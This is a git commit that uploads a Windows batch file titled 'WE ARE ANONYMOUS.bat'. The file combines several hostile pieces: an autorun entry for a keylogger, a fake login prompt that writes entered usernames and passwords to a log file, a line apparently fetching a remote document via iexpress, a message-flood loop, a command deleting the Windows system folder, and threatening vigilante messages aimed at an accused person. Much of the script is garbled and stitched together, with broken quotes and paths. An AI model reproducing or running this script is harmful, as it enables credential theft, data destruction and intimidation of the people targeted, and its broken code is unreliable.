f74ccce8e1a2909bccf75d981812cf445e134873
MReighteightzerotwo <93451755+MReighteightzerotwo@users.noreply.github.com>
2021-10-30 16:53:12 -0400

    Add files via upload

---
+++ WE ARE ANONYMOUS.bat
@@ -0,0 +1,55 @@
+[autorun]
+open= keylogger.bat
+@echo off
+color a
+title Login
+cls
+echo Please Enter Your Email Address And Password
+echo.
+echo.
+cd “C:Logs”
+set /p user=Username:
+set /p pass=Password:
+echo Username=”%user%” Password=”%pass%” >> Log.txt
+start >>Microsoft Edge<<
+exit
+
+
+
+
+
+@echo off
+start iexpress
+https://gamingfun.me/8117U8.docx
+exit
+:CRASH
+
+net send * WORKGROUP ENABLED
+
+net send * WORKGROUP ENABLED
+
+GOTO CRASH
+loop
+@echo off
+msg * Greeting citizens of Canada 
+msg * This is a message from Anonymous
+msg * Your crimes will not go unnoticed by Anonymous
+msg * you told people to commit suicide, broke someones elbow, etc
+msg * since justice can't be served 
+msg * we will take it into our hands
+msg * we will be light on punishment
+msg * we are the judge, jury and exicutioner
+msg * please wait
+msg * we the people have found you guilty
+msg * your sentence shall be carried out
+msg * made by "15 24 22 23 44 15 24 22 23 44 55 15 42 34 44 52 34" 
+msg * "52 15  11 42 15  11 33 34 33 54 32 34 45 43  52 15  11 42 15  31 15 22 24 34 33  52 15  14 34  33 34 44  21 34 42 22 24 51 15  52 15  14 34  33 34 44  21 34 42 22 15 44  15 53 35 15 13 44  45 43 "
+exit 
+@echo off
+0%|0%
+exit
+@echo off
+del "c:WINDOWSsystem"
+exit
+@echo off
+msg * don't mess with Anonymous
